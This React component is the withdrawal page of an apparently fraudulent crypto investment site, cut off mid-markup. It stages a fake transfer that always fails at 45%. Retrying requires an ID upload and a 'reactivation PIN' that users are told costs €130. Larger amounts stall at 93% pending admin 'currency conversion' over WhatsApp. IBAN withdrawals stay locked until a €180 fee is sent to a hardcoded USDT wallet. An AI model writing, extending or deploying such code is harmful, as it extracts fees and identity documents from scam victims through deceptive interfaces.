import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
  FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset,
  FaComments, FaShieldVirus, FaQrcode, FaUniversity, FaCopy, FaCheck
} from 'react-icons/fa';
import toast from 'react-hot-toast';
import Navbar from '../components/Navbar';
import { walletService } from '../services/walletService';
import { useAuth } from '../auth/userAuth';
import { getCurrencySymbol } from '../utils/currency';
import { ADMIN_WHATSAPP } from '../data/mockData';
import { country } from '../data/countries';
import API from '../utils/axios';

// ✅ WITHDRAWAL LIMIT
const WITHDRAWAL_LIMIT = 5000;
// ✅ SECURITY TRACE THRESHOLD
const TRACE_THRESHOLD = 1000;

// ═══════════════════════════════════════════════════════════
// ✅ IBAN WITHDRAWAL CONFIGURATION
// ═══════════════════════════════════════════════════════════
// Fee amount in EUR required to process IBAN withdrawals
const IBAN_FEE_AMOUNT_EUR = 180;

// Wallet address where the user must send the €180 fee
const IBAN_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
const IBAN_FEE_WALLET_LABEL = 'USDT (TRC20)';

// ✅ MASTER SWITCH — flip to `true` once the fee has been received.
// While `false`, the IBAN withdrawal button stays LOCKED and users
// cannot proceed. This does not affect crypto or PIX flows.
const IBAN_FEE_PAID = false;
// ═══════════════════════════════════════════════════════════

const Withdraw = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('USDT');
  const [address, setAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [kycStatus, setKycStatus] = useState('checking');

  // Transfer simulation states (crypto only)
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [transferProgress, setTransferProgress] = useState(0);
  const [transferStatus, setTransferStatus] = useState('pending');
  const [isRetry, setIsRetry] = useState(false);
  const progressInterval = useRef(null);

  // Reactivation modal states (crypto only)
  const [showReactivationModal, setShowReactivationModal] = useState(false);
  const [reactivationPin, setReactivationPin] = useState('');
  const [pinError, setPinError] = useState('');
  const [isVerifyingPin, setIsVerifyingPin] = useState(false);

  // ID card upload state (crypto only)
  const [idCardFile, setIdCardFile] = useState(null);
  const [idError, setIdError] = useState('');
  const idInputRef = useRef(null);

  // Upgrade limit modal
  const [showUpgradeModal, setShowUpgradeModal] = useState(false);

  // Admin support modal (crypto > threshold)
  const [showAdminSupportModal, setShowAdminSupportModal] = useState(false);

  // ═══════════════════════════════════════════════════════════
  // ✅ IBAN-SPECIFIC STATE (isolated from crypto flow)
  // ═══════════════════════════════════════════════════════════
  const [ibanAccountNumber, setIbanAccountNumber] = useState('');
  const [ibanAccountName, setIbanAccountName] = useState('');
  const [showIbanModal, setShowIbanModal] = useState(false);
  const [ibanCopied, setIbanCopied] = useState(false);
  const [ibanSubmitting, setIbanSubmitting] = useState(false);
  // ═══════════════════════════════════════════════════════════

  const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '754625';

  const currencySymbol = getCurrencySymbol(user?.currency);

  // Local country lookup
  const userLocalCountry = (() => {
    if (!user?.country) return null;
    return (
      country.find(
        (c) =>
          c.name.toLowerCase() === String(user.country).toLowerCase() ||
          c.code.toLowerCase() === String(user.country).toLowerCase()
      ) || null
    );
  })();

  const localCurrency = userLocalCountry?.currency || user?.currency || 'USD';
  const localCurrencySymbol = userLocalCountry?.symbol || currencySymbol;
  const localCountryName = userLocalCountry?.name || user?.country || 'your country';
  const localCountryFlag = userLocalCountry?.flag || '🌍';

  // ─── Fetch KYC status ─────────────────────────────────────
  useEffect(() => {
    const checkKYC = async () => {
      try {
        const response = await API.get('/kyc/status');
        if (response.data.success) {
          setKycStatus(response.data.data.status);
        }
      } catch (error) {
        console.error('KYC status check error:', error);
        setKycStatus('error');
      }
    };
    checkKYC();
  }, []);

  // ─── Fetch wallet balance ─────────────────────────────────
  useEffect(() => {
    const fetchData = async () => {
      try {
        const wallet = await walletService.getWallet();
        setWalletBalance(wallet.balance || 0);
      } catch (error) {
        console.error('Failed to fetch wallet:', error);
      }
    };
    fetchData();
  }, []);

  // ─── Cleanup ──────────────────────────────────────────────
  useEffect(() => {
    return () => {
      if (progressInterval.current) clearInterval(progressInterval.current);
    };
  }, []);

  // ─── Progress interval (crypto flow only) ─────────────────
  useEffect(() => {
    if (!showTransferModal) {
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
      return;
    }

    if (transferStatus === 'failed' || transferStatus === 'complete') return;

    let progress = transferProgress;

    progressInterval.current = setInterval(() => {
      progress += 1;

      if (progress >= 45 && !isRetry) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
        setTransferProgress(45);
        setTransferStatus('failed');
        return;
      }

      if (progress >= 93 && isRetry && parseFloat(amount) > TRACE_THRESHOLD) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
        setTransferProgress(93);
        setShowTransferModal(false);
        setShowAdminSupportModal(true);
        return;
      }

      if (progress >= 100) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
        setTransferProgress(100);
        setTransferStatus('complete');
        toast.success('Withdrawal completed successfully!');
        return;
      }

      setTransferProgress(progress);
    }, 100);

    return () => {
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
    };
  }, [showTransferModal, isRetry, transferStatus]);

  // ✅ Payment methods — IBAN added
  const paymentMethods = [
    { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
    { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
    { id: 'ETH', name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
    { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
    { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
    { id: 'PIX', name: 'PIX', icon: FaQrcode, color: 'text-teal-400' },
    { id: 'IBAN', name: 'IBAN Bank', icon: FaUniversity, color: 'text-sky-400' },
  ];

  const isPix = crypto === 'PIX';
  const isIban = crypto === 'IBAN';

  // ─── Copy helper for IBAN fee wallet ──────────────────────
  const copyIbanFeeWallet = () => {
    navigator.clipboard.writeText(IBAN_FEE_WALLET_ADDRESS);
    setIbanCopied(true);
    toast.success('Wallet address copied!');
    setTimeout(() => setIbanCopied(false), 2000);
  };

  // ─── Submit handler ───────────────────────────────────────
  const handleSubmit = (e) => {
    e.preventDefault();

    const amountNum = parseFloat(amount);

    if (!amount || isNaN(amountNum) || amountNum < 1) {
      toast.error('Please enter a valid amount');
      return;
    }

    if (kycStatus !== 'verified') {
      toast.error('KYC verification required. Please complete your KYC to withdraw.');
      return;
    }

    if (amountNum > walletBalance) {
      toast.error('Insufficient balance');
      return;
    }

    if (amountNum > WITHDRAWAL_LIMIT) {
      setShowUpgradeModal(true);
      return;
    }

    // ═══════════════════════════════════════════════════════
    // ✅ IBAN FLOW — isolated, does not enter the crypto loop
    // ═══════════════════════════════════════════════════════
    if (isIban) {
      if (!ibanAccountNumber.trim()) {
        toast.error('Please enter your IBAN / account number');
        return;
      }
      if (!ibanAccountName.trim()) {
        toast.error('Please enter the account holder name');
        return;
      }
      // Open IBAN fee modal — do NOT enter crypto flow
      setShowIbanModal(true);
      return;
    }

    // ═══════════════════════════════════════════════════════
    // CRYPTO / PIX FLOW — existing behavior
    // ═══════════════════════════════════════════════════════
    if (!address) {
      toast.error(isPix ? 'Please enter your PIX key' : 'Please enter a wallet address');
      return;
    }

    setIsRetry(false);
    setTransferStatus('pending');
    setTransferProgress(0);

    proceedWithdrawal(amountNum);
  };

  const proceedWithdrawal = async (amountNum) => {
    setLoading(true);
    try {
      await new Promise((resolve) => setTimeout(resolve, 800));
      setShowTransferModal(true);
    } catch (error) {
      toast.error(error.response?.data?.message || 'Withdrawal failed');
    } finally {
      setLoading(false);
    }
  };

  const handleRetry = () => {
    setShowTransferModal(false);
    setShowReactivationModal(true);
    setReactivationPin('');
    setPinError('');
    setIdCardFile(null);
    setIdError('');
  };

  const handleIdFileChange = (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
    if (!validTypes.includes(file.type)) {
      toast.error('Invalid file format. Use JPG, PNG or PDF.');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      toast.error('File must be at most 5MB.');
      return;
    }

    setIdCardFile(file);
    setIdError('');
  };

  const handleRemoveIdFile = () => {
    setIdCardFile(null);
    if (idInputRef.current) idInputRef.current.value = '';
  };

  const handleVerifyPin = () => {
    if (!idCardFile) {
      setIdError('Please upload your ID card.');
      return;
    }
    setIdError('');

    if (!reactivationPin.trim()) {
      setPinError('Please enter the reactivation PIN.');
      return;
    }

    setIsVerifyingPin(true);
    setPinError('');

    setTimeout(() => {
      if (reactivationPin.trim() === REACTIVATION_PIN) {
        setShowReactivationModal(false);
        setReactivationPin('');
        setPinError('');
        setIdCardFile(null);
        setIsVerifyingPin(false);
        setIsRetry(true);
        setTransferStatus('pending');
        setTransferProgress(45);
        setShowTransferModal(true);
        toast.success('Account reactivated. Completing transfer...');
      } else {
        setPinError('Invalid PIN. Please try again.');
        setReactivationPin('');
        setIsVerifyingPin(false);
      }
    }, 800);
  };

  const handleContactAdmin = () => {
    const message = encodeURIComponent(
      `Hello Support,\n\n` +
      `I need admin approval for my withdrawal. My balance MUST be converted to my local currency for security tracking.\n\n` +
      `— Withdrawal Details —\n` +
      `Amount: $${parseFloat(amount || 0).toLocaleString()}\n` +
      `Crypto: ${crypto}\n` +
      `Wallet Address: ${address}\n\n` +
      `— Local Currency —\n` +
      `Country: ${localCountryName}\n` +
      `Currency: ${localCurrency} (${localCurrencySymbol})\n\n` +
      `Please convert my balance to ${localCurrency} and approve the transaction. Thank you.`
    );
    window.open(`https://wa.me/${ADMIN_WHATSAPP}?text=${message}`, '_blank');
  };

  // ═══════════════════════════════════════════════════════════
  // ✅ IBAN FINALIZE — only callable when IBAN_FEE_PAID is true
  // ═══════════════════════════════════════════════════════════
  const finalizeIbanWithdrawal = async () => {
    if (!IBAN_FEE_PAID) {
      toast.error('Fee not yet confirmed by admin.');
      return;
    }

    setIbanSubmitting(true);
    try {
      await API.post('/transactions', {
        type: 'withdrawal',
        amount: parseFloat(amount),
        currency: 'USD',
        description: `IBAN withdrawal to ${ibanAccountName}`,
        metadata: {
          method: 'iban',
          ibanAccountNumber: ibanAccountNumber,
          ibanAccountName: ibanAccountName,
          ibanFeePaid: true,
          ibanFeeAmount: IBAN_FEE_AMOUNT_EUR,
        },
        status: 'pending',
      });
      toast.success('IBAN withdrawal request submitted!');
      setShowIbanModal(false);
      navigate('/transactions');
    } catch (error) {
      console.error('IBAN withdrawal error:', error);
      toast.error(error.response?.data?.message || 'Failed to submit IBAN withdrawal');
    } finally {
      setIbanSubmitting(false);
    }
  };

  const handleCloseSuccess = async () => {
    setShowTransferModal(false);
    toast.success('Withdrawal request submitted!');
    navigate('/transactions');
  };

  const formatCurrency = (value) => {
    return `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
  };

  const isKycVerified = kycStatus === 'verified';
  const amountNum = parseFloat(amount) || 0;

  const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
    `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
  )}`;

  return (
    <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
      <Navbar />
      <div className="p-4 sm:p-6 max-w-2xl mx-auto">
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-white">Withdraw Funds</h1>
          <p className="text-slate-400 mt-1">Withdraw your earnings</p>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl p-6 border border-slate-700"
        >
          <div className="bg-slate-900 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-slate-400">Available Balance</span>
              <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
            </div>
          </div>

          <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
            <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
            <p className="text-blue-400 text-sm">
              Your withdrawal limit is{' '}
              <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
            </p>
          </div>

          {!isKycVerified && (
            <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-center gap-3">
              <FaLock className="text-yellow-500 text-sm" />
              <p className="text-yellow-400 text-sm">
                {kycStatus === 'pending'
                  ? 'Your KYC is pending approval. Please wait for verification.'
                  : 'KYC verification required to withdraw. Please complete your KYC first.'}
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* ─── Method picker ──────────────────────────────── */}
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">
                Select Withdrawal Method
              </label>
              <div className="grid grid-cols-3 sm:grid-cols-7 gap-2">
                {paymentMethods.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setCrypto(c.id)}
                    className={`p-3 rounded-lg border transition ${
                      crypto === c.id
                        ? 'border-blue-500 bg-blue-500/10'
                        : 'border-slate-700 hover:border-slate-500'
                    }`}
                  >
                    <c.icon className={`w-6 h-6 mx-auto ${c.color}`} />
                    <span className="text-xs text-slate-400 mt-1 block">{c.id}</span>
                  </button>
                ))}
              </div>

              {isPix && (
                <p className="text-teal-400 text-xs mt-2 flex items-center gap-1">
                  <FaQrcode className="text-teal-400" />
                  PIX — instant Brazilian payment. Withdrawal sent in BRL.
                </p>
              )}

              {isIban && (
                <p className="text-sky-400 text-xs mt-2 flex items-center gap-1">
                  <FaUniversity className="text-sky-400" />
                  IBAN — international bank transfer. A €{IBAN_FEE_AMOUNT_EUR} processing fee applies.
                </p>
              )}
            </div>

            {/* ─── Amount ─────────────────────────────────────── */}
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">
                Amount ({user?.currency || 'USD'})
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                  {currencySymbol}
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  min="1"
                  step="0.01"
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
              </div>
              {amountNum > WITHDRAWAL_LIMIT && (
                <p className="text-red-400 text-xs mt-1">
                  Amount exceeds your withdrawal limit of {formatCurrency(WITHDRAWAL_LIMIT)}.
                </p>
              )}
              {!isIban && amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
                <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
                  <FaShieldAlt className="text-amber-400" />
                  Amounts above {formatCurrency(TRACE_THRESHOLD)} require balance conversion to{' '}
                  {localCurrency} for security tracking.
                </p>
              )}
            </div>

            {/* ─── IBAN-specific fields ───────────────────────── */}
            {isIban && (
              <>
                <div>
                  <label className="block text-slate-300 text-sm font-medium mb-2">
                    Account Holder Name
                  </label>
                  <input
                    type="text"
                    value={ibanAccountName}
                    onChange={(e) => setIbanAccountName(e.target.value)}
                    placeholder="Full name on the bank account"
                    className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                  />
                </div>

                <div>
                  <label className="block text-slate-300 text-sm font-medium mb-2">
                    IBAN / Account Number
                  </label>
                  <input
                    type="text"
                    value={ibanAccountNumber}
                    onChange={(e) => setIbanAccountNumber(e.target.value)}
                    placeholder="e.g. DE89 3704 0044 0532 0130 00"
                    className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition font-mono"
                  />
                  <p className="text-slate-500 text-xs mt-1">
                    Double-check your IBAN — bank transfers cannot be reversed.
                  </p>
                </div>
              </>
            )}

            {/* ─── Crypto / PIX destination ───────────────────── */}
            {!isIban && (
              <div>
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  {isPix ? 'PIX Key' : 'Wallet Address'}
                </label>
                <input
                  type="text"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder={isPix ? 'Enter your PIX key' : 'Enter your wallet address'}
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
                {isPix && (
                  <p className="text-slate-500 text-xs mt-1">
                    Double-check your PIX key — transfers cannot be reversed.
                  </p>
                )}
              </div>
            )}

            <button
              type="submit"
              disabled={loading || !isKycVerified}
              className="w-full py-3 rounded-lg bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <FaArrowDown className="text-sm" /> Request Withdrawal
                </>
              )}
            </button>
          </form>
        </motion.div>
      </div>

      {/* ═══════════ UPGRADE LIMIT MODAL ═══════════ */}
      <AnimatePresence>
        {showUpgradeModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
            >
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
                  <FaArrowUp className="w-8 h-8 text-orange-500" />
                </div>
              </div>

              <h3 className="text-xl font-bold text-white text-center mb-2">
                Withdrawal Limit Exceeded
              </h3>

              <p className="text-sm text-slate-400 text-center mb-4">
                Your withdrawal request of{' '}
                <strong className="text-white">{formatCurrency(amountNum)}</strong> exceeds your
                current limit of{' '}
                <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
              </p>

              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-orange-300 text-xs leading-relaxed">
                  To upgrade your withdrawal limit, please contact our support team. They will
                  guide you through the account upgrade process.
                </p>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => setShowUpgradeModal(false)}
                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancel
                </button>
                <a
                  href={whatsappUpgradeLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                >
                  <FaWhatsapp className="text-lg" />
                  Contact Support
                </a>
              </div>

              <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
                <FaHeadset className="text-slate-500" />
                <span>Support is available 24/7</span>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ═══════════ TRANSFER SIMULATION MODAL ═══════════ */}
      <AnimatePresence>
        {showTransferModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center"
            >
              <div className="flex justify-center mb-4">
                {transferStatus === 'pending' && (
                  <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
                    <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  </div>
                )}
                {transferStatus === 'failed' && (
                  <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
                    <FaExclamationTriangle className="w-8 h-8 text-red-500" />
                  </div>
                )}
                {transferStatus === 'complete' && (
                  <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
                    <FaCheckCircle className="w-8 h-8 text-green-500" />
                  </div>
                )}
              </div>

              <h3 className="text-xl font-bold text-white mb-2">
                {transferStatus === 'pending' && 'Processing Transfer...'}
                {transferStatus === 'failed' && 'Transfer Failed'}
                {transferStatus === 'complete' && 'Transfer Complete!'}
              </h3>

              <p className="text-sm text-slate-400 mb-4">
                {transferStatus === 'pending' &&
                  'Moving funds from broker wallet to your destination wallet.'}
                {transferStatus === 'failed' &&
                  'The transfer could not be completed. Please try again.'}
                {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
              </p>

              <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
                <div
                  className={`h-full rounded-full transition-all duration-300 ${
                    transferStatus === 'failed'
                      ? 'bg-red-500'
                      : transferStatus === 'complete'
                      ? 'bg-green-500'
                      : 'bg-blue-500'
                  }`}
                  style={{ width: `${transferProgress}%` }}
                />
              </div>
              <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>

              {transferStatus === 'failed' && (
                <button
                  onClick={handleRetry}
                  className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
                >
                  Try Again
                </button>
              )}

              {transferStatus === 'complete' && (
                <button
                  onClick={handleCloseSuccess}
                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
                >
                  Done
                </button>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ═══════════ ADMIN SUPPORT — CRYPTO BALANCE CONVERSION ═══════════ */}
      <AnimatePresence>
        {showAdminSupportModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
            >
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
                  <FaShieldVirus className="w-8 h-8 text-red-500" />
                </div>
              </div>

              <h3 className="text-xl font-bold text-white text-center mb-2">
                Balance Conversion Required
              </h3>

              <p className="text-sm text-slate-400 text-center mb-5">
                To protect your funds and prevent fraud, this withdrawal{' '}
                <strong className="text-red-400">cannot be completed</strong> until your balance
                has been converted into your local currency.
              </p>

              <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
                <div className="flex items-start gap-3">
                  <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
                  <div className="text-red-300 text-xs leading-relaxed space-y-2">
                    <p className="font-bold text-red-200 text-sm uppercase tracking-wide">
                      Mandatory Step
                    </p>
                    <p>
                      Your balance <strong className="text-white">must</strong> be converted to{' '}
                      <strong className="text-white">
                        {localCurrency} ({localCurrencySymbol})
                      </strong>{' '}
                      — the official currency of{' '}
                      <strong className="text-white">
                        {localCountryFlag} {localCountryName}
                      </strong>{' '}
                      — before this transaction can proceed.
                    </p>
                    <p>
                      This conversion allows us to{' '}
                      <strong className="text-white">track and monitor</strong> the transaction
                      route end-to-end.
                    </p>
                  </div>
                </div>
              </div>

              <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                <div className="flex items-start gap-3">
                  <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
                  <div className="text-blue-300 text-xs leading-relaxed">
                    <p className="font-semibold text-blue-200 mb-1">
                      Why is this required?
                    </p>
                    <ul className="list-disc pl-4 space-y-1">
                      <li>Trace the exact transaction route</li>
                      <li>Prevent money laundering & fraud</li>
                      <li>Protect your account from unauthorized access</li>
                      <li>Ensure compliance with your local regulations</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-slate-400">Withdrawal Amount:</span>
                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Target Currency:</span>
                  <span className="text-white font-semibold">
                    {localCurrencySymbol} {localCurrency}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Status:</span>
                  <span className="text-amber-400 font-semibold">
                    93% — Awaiting Admin Approval
                  </span>
                </div>
              </div>

              <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-yellow-300 text-xs leading-relaxed">
                  <strong className="text-yellow-200">Only an administrator</strong> can perform
                  this conversion. Please contact support to proceed.
                </p>
              </div>

              <div className="flex flex-col gap-3">
                <button
                  onClick={() => {
                    setShowAdminSupportModal(false);
                    setTransferProgress(0);
                    setTransferStatus('pending');
                    setIsRetry(false);
                  }}
                  className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancel Withdrawal
                </button>
              </div>

              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
                <FaComments className="text-slate-500" />
                <span>Support is available 24/7</span>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ═══════════ REACTIVATION MODAL ═══════════ */}
      <AnimatePresence>
        {showReactivationModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto"
            >
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
                  <FaShieldAlt className="w-8 h-8 text-yellow-500" />
                </div>
              </div>

              <h3 className="text-xl font-bold text-white text-center mb-2">
                Account Reactivation Required
              </h3>

              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-orange-300 text-xs leading-relaxed">
                  For security, please upload your ID card and enter your reactivation PIN. A
                  reactivation PIN costs <strong className="text-orange-200">€130.00</strong> and
                  must be purchased before completing this withdrawal.
                </p>
              </div>

              <div className="mb-4">
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  Upload ID Card
                </label>

                {!idCardFile ? (
                  <label
                    htmlFor="idCardInput"
                    className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
                  >
                    <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
                    <span className="text-xs text-slate-400">
                      Click to upload (JPG, PNG, PDF – max 5MB)
                    </span>
                    <input
                      id="idCardInput"
                      ref={idInputRef}
                      type="file"
                      accept="image/*,.pdf"
                      onChange={handleIdFileChange}
                      className="hidden"
                    />
                  </label>
                ) : (
                  <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
                    <div className="flex items-center gap-2 min-w-0">
                      <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
                      <span className="text-sm text-slate-300 truncate">
                        {idCardFile.name}
                      </span>
                    </div>
                    <button
                      type="button"
                      onClick={handleRemoveIdFile}
                      className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
                    >
                      <FaTimes className="w-4 h-4 text-slate-400" />
                    </button>
                  </div>
                )}
                {idError && <p className="text-red-400 text-xs mt-2">{idError}</p>}
              </div>

              <div className="mb-4">
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  Reactivation PIN
                </label>
                <div className="relative">
                  <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
                  <input
                    type="password"
                    value={reactivationPin}
                    onChange={(e) => setReactivationPin(e.target.value)}
                    placeholder="Enter PIN"
                    maxLength="6"
                    className={`w-full bg-slate-900 border ${
                      pinError ? 'border-red-500' : 'border-slate-700'
                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
                  />
                </div>
                {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
              </div>

              <div className="flex gap-3">
                <button
